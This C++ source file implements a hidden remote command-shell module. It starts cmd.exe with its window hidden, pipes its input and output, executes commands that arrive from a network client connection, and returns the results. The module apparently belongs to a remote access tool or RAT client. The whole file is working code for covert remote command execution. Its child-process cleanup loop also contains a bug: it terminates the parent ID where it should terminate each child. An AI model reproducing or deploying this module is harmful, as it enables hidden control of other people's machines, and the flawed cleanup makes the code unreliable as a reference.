#include "Cmd.h"
#include <iostream>

using std::iostream;

CCmd::CCmd(CIOCPClient *pClient) :
CMsgHandler(pClient, CMD)
{
	m_hReadPipe = NULL;
	m_hWritePipe = NULL;

	m_hReadThread = NULL;

	memset(&m_pi, 0, sizeof(m_pi));
}


CCmd::~CCmd()
{
}
/*
	@ Date:		2022 07 11
	@ Modify:	优化解决cmd 行缓冲太慢的问题
*/

void __stdcall ReadThread(CCmd*pCmd)
{
	char buffer[0x100];

	char szMsg[0x1000];
	DWORD dwMsgLength = 0;

	DWORD dwRead = 0;
	//07 - 11
	while (true){
		BOOL bResult = PeekNamedPipe(pCmd->m_hReadPipe, buffer, 0x100, &dwRead, 0, 0);

		if (!bResult){
			//pipe is closed,  GetLastError() == 0x6d
			break;
		}
		else if(dwRead != 0){				//Read data to szMsg Buffer;
			// szMsgBuf is full
			if (dwMsgLength + dwRead + 1 > 0x1000){
				pCmd->SendMsg(CMD_RESULT, szMsg, dwMsgLength + 1);
				dwMsgLength = 0;
			}

			ReadFile(pCmd->m_hReadPipe, szMsg + dwMsgLength, dwRead, &dwRead, 0);
			dwMsgLength += dwRead;
			szMsg[dwMsgLength] = 0;
		}
		//no data,send the data in szMsgBuffer
		else if (dwMsgLength){
			pCmd->SendMsg(CMD_RESULT, szMsg, dwMsgLength + 1);
			dwMsgLength = 0;
		}
		else{
			Sleep(200);
		}
	}

	pCmd->Close();
}

#include "utils.h"
#include <TlHelp32.h>

void CCmd::OnClose()
{
	//关掉cmd.;
	if (m_pi.hProcess != NULL){
		//终止所有子进程.
		PROCESSENTRY32 pe = { sizeof (PROCESSENTRY32 )};
		HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		BOOL bFind = Process32First(hSnap, &pe);
		while (bFind) {
			if (pe.th32ParentProcessID == m_pi.dwProcessId){
				//kill process.
				DWORD pid = pe.th32ParentProcessID;
				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
				if (hProcess){
					TerminateProcess(hProcess, 0);
					CloseHandle(hProcess);
				}
			}
			bFind = Process32Next(hSnap, &pe);
		}

		CloseHandle(hSnap);
		//关闭cmd.
		TerminateProcess(m_pi.hProcess, 0);
		CloseHandle(m_pi.hProcess);
		CloseHandle(m_pi.hThread);
	}

	//线程ReadFile会结束，等待线程退出。;
	dbg_log("Read File Will read eof,wait Read thread exit.");
	if(WAIT_TIMEOUT == WaitForSingleObject(m_hReadThread, 6666)){
		TerminateThread(m_hReadThread,0);
		WaitForSingleObject(m_hReadThread, INFINITE);
	}
	CloseHandle(m_hReadThread);

	//cmd 杀不掉;
	//关闭管道.;
	CloseHandle(m_hReadPipe);
	CloseHandle(m_hWritePipe);
}
void CCmd::OnOpen()
{
	DWORD dwStatu = 0;
	dwStatu = CmdBegin();

	//成功.;
	SendMsg(CMD_BEGIN, (char*)&dwStatu, sizeof(DWORD));

	if (dwStatu == -1){
		Close();
	}
}

void CCmd::OnReadMsg(WORD Msg ,DWORD dwSize, char*Buffer)
{
	switch (Msg){
	case CMD_COMMAND:
		OnCommand(Buffer);
		break;
	default:
		break;
	}
}

void CCmd::OnCommand(char*szCmd)
{
	DWORD dwWrite = 0;
	DWORD dwLeft = lstrlenA(szCmd);
	while(dwLeft>0){
		dwWrite = 0;
		if (!WriteFile(m_hWritePipe, szCmd,dwLeft, &dwWrite, NULL)){	
			Close();
			break;
		}
		szCmd+=dwWrite;
		dwLeft -= dwWrite;
	}
}
//cmd退出有两种情况:;
//		1.server 关闭	cmd不会退出,需要自己关闭.;
//		2.输入exit.		Read会失败.;

int CCmd::CmdBegin()
{ 
	HANDLE hCmdReadPipe = NULL, hCmdWritePipe = NULL;
	//
	SECURITY_ATTRIBUTES sa = { 0 };
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if (FALSE == CreatePipe(&m_hReadPipe, &hCmdWritePipe, &sa, 0))
		return -1;
	if (FALSE == CreatePipe(&hCmdReadPipe,&m_hWritePipe,  &sa, 0))
		return -1;

	STARTUPINFOW si = { 0 };
	si.cb = sizeof(si);
	si.wShowWindow = SW_HIDE;
	//si.wShowWindow = SW_SHOW;
	si.hStdError = hCmdWritePipe;
	si.hStdOutput = hCmdWritePipe;
	si.hStdInput = hCmdReadPipe;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	
	//
	TCHAR szCmd[] = TEXT("cmd.exe");
	if (!CreateProcess(NULL, szCmd, NULL, NULL, TRUE, 
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &m_pi)){
		return -1;
	}

	//不需要这两个,直接关掉.;
	CloseHandle(hCmdReadPipe);
	CloseHandle(hCmdWritePipe);

	m_hReadThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadThread, this, NULL, NULL);
	if (!m_hReadThread)
		return -1;
	return 0;
}